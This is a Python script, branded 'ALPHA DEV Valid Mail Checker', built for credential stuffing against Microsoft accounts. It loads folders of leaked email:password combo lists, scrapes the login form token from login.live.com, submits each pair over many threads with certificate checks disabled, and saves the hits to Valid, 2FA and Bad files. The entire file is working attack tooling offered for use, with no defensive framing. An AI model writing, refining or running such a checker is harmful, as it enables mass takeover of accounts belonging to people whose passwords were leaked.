import os
import re
import time
import threading
import concurrent.futures
from colorama import Fore, init
from urllib.parse import urlparse, parse_qs
import requests
import urllib3

# Disable HTTPS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ASCII ART LOGO
logo = f"""{Fore.CYAN}
 $$$$$$\  $$\       $$\        $$$$$$\ $$\     $$\ 
$$  __$$\ $$ |      $$ |      $$  __$$\\$$\   $$  |
$$ /  $$ |$$ |      $$ |      $$ /  $$ |\$$\ $$  / 
$$$$$$$$ |$$ |      $$ |      $$$$$$$$ | \$$$$  /  
$$  __$$ |$$ |      $$ |      $$  __$$ |  \$$  /   
$$ |  $$ |$$ |      $$ |      $$ |  $$ |   $$ |    
$$ |  $$ |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |   $$ |    
\__|  \__|\________|\________|\__|  \__|   \__|     
{Fore.RESET}"""

# URL and Constants
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
MAX_RETRIES = 3

# Stats
stats = {
    'total': 0,
    'valid': 0,
    'bad': 0,
    'twofa': 0,
    'checked': 0,
    'errors': 0,
    'cpm': 0,
    'active_threads': 0,
    'files_processed': 0
}

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def update_title():
    while True:
        cpm = stats['cpm']
        stats['cpm'] = 0
        status = (f"Checked: {stats['checked']}/{stats['total']} | "
                  f"Valid: {stats['valid']} | Bad: {stats['bad']} | "
                  f"2FA: {stats['twofa']} | CPM: {cpm*60} | Threads: {stats['active_threads']}")
        print(f"\r{Fore.CYAN}{status}{Fore.RESET}", end="", flush=True)
        time.sleep(1)

def get_urlPost_sFTTag(session):
    retries = 0
    while retries < MAX_RETRIES:
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            sFTTag_match = re.search(r'value="(.+?)"', text)
            urlPost_match = re.search(r"urlPost:'(.+?)'", text)
            if sFTTag_match and urlPost_match:
                return urlPost_match.group(1), sFTTag_match.group(1), session
        except:
            retries += 1
            time.sleep(1)
            stats['errors'] += 1
    return None, None, None

def check_account(email, password):
    session = requests.Session()
    session.verify = False
    try:
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost:
            return "error"
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sFTTag
        }
        login_request = session.post(
            urlPost,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=True,
            timeout=15
        )
        if '#' in login_request.url and login_request.url != sFTTag_url:
            return "valid"
        elif 'cancel?mkt=' in login_request.text:
            return "valid"
        elif any(x in login_request.text for x in ["recover?mkt", "identity/confirm", "Email/Confirm", "/Abuse?mkt="]):
            return "twofa"
        elif any(x in login_request.text.lower() for x in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account"]):
            return "bad"
        else:
            return "error"
    except:
        return "error"
    finally:
        session.close()

def process_combo(combo, filename):
    stats['active_threads'] += 1
    try:
        email, password = combo.strip().replace(' ', '').split(":")
        if not email or not password:
            return "bad", combo
        result = check_account(email, password)
        stats['checked'] += 1
        stats['cpm'] += 1
        if result == "valid":
            stats['valid'] += 1
            save_result(filename, "Valid.txt", combo)
            print(f"\n{Fore.GREEN}VALID: {email}:{password}{Fore.RESET}")
        elif result == "twofa":
            stats['twofa'] += 1
            save_result(filename, "2FA.txt", combo)
            print(f"\n{Fore.YELLOW}2FA : {email}:{password}{Fore.RESET}")
        elif result == "bad":
            stats['bad'] += 1
            save_result(filename, "Bad.txt", combo)
            print(f"\n{Fore.RED}BAD  : {email}:{password}{Fore.RESET}")
        else:
            stats['errors'] += 1
    except:
        stats['bad'] += 1
        stats['checked'] += 1
        stats['cpm'] += 1
        save_result(filename, "Bad.txt", combo)
        print(f"\n{Fore.RED}BAD  : {combo.strip()}{Fore.RESET}")
    finally:
        stats['active_threads'] -= 1

def save_result(filename, result_file, combo):
    result_dir = os.path.join("results", os.path.splitext(filename)[0])
    os.makedirs(result_dir, exist_ok=True)
    with open(os.path.join(result_dir, result_file), 'a', encoding='utf-8') as f:
        f.write(f"{combo.strip()}\n")

def load_files_from_folder(folder_path):
    combos = {}
    for filename in os.listdir(folder_path):
        if filename.lower().endswith('.txt'):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f.readlines() if ':' in line]
                    unique_lines = list(set(lines))
                    combos[filename] = unique_lines
                    stats['total'] += len(unique_lines)
                    stats['files_processed'] += 1
            except Exception as e:
                print(f"{Fore.RED}Error reading file {filename}: {str(e)}{Fore.RESET}")
    return combos

def main():
    clear_screen()
    print(logo)
    print(f"{Fore.CYAN}ALPHA DEV | Valid Mail Checker | Android Ready{Fore.RESET}")
    print(f"{Fore.YELLOW}Start your checking in seconds...{Fore.RESET}\n")

    while True:
        folder_path = input(f"{Fore.BLUE}Enter folder path containing .txt files: {Fore.RESET}").strip()
        if os.path.isdir(folder_path):
            break
        print(f"{Fore.RED}Invalid folder path. Try again.{Fore.RESET}")

    while True:
        try:
            threads = int(input(f"{Fore.BLUE}Enter number of threads (1-10 recommended): {Fore.RESET}"))
            if 1 <= threads <= 50:
                break
            print(f"{Fore.RED}Enter between 1 and 50 threads.{Fore.RESET}")
        except:
            print(f"{Fore.RED}Invalid input. Please enter a number.{Fore.RESET}")

    threading.Thread(target=update_title, daemon=True).start()

    print(f"\n{Fore.BLUE}Loading files...{Fore.RESET}")
    combos = load_files_from_folder(folder_path)

    if not combos:
        print(f"{Fore.RED}No valid .txt files found in the folder.{Fore.RESET}")
        input("Press Enter to exit...")
        return

    print(f"\n{Fore.GREEN}Loaded {stats['files_processed']} files with {stats['total']} combos.{Fore.RESET}")
    print(f"{Fore.MAGENTA}Results will be saved in /results/[filename]/{Fore.RESET}\n")

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for filename, file_combos in combos.items():
            print(f"{Fore.BLUE}Processing {filename} ({len(file_combos)} combos){Fore.RESET}")
            futures = [executor.submit(process_combo, combo, filename) for combo in file_combos]
            for _ in concurrent.futures.as_completed(futures):
                pass

    minutes, seconds = divmod(time.time() - start_time, 60)

    print(f"\n{Fore.GREEN}Check Complete!{Fore.RESET}")
    print(f"{Fore.CYAN}Total Files: {stats['files_processed']}")
    print(f"{Fore.CYAN}Total Combos: {stats['total']}")
    print(f"{Fore.GREEN}Valid: {stats['valid']}")
    print(f"{Fore.YELLOW}2FA  : {stats['twofa']}")
    print(f"{Fore.RED}Bad   : {stats['bad']}")
    print(f"{Fore.MAGENTA}Errors: {stats['errors']}")
    print(f"{Fore.BLUE}Time taken: {int(minutes)}m {int(seconds)}s{Fore.RESET}")
    print(f"{Fore.CYAN}Results saved in 'results' folder.{Fore.RESET}")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Interrupted by user.{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Fore.RESET}")
    finally:
        print(f"{Fore.YELLOW}Check results inside 'results' folder.{Fore.RESET}")
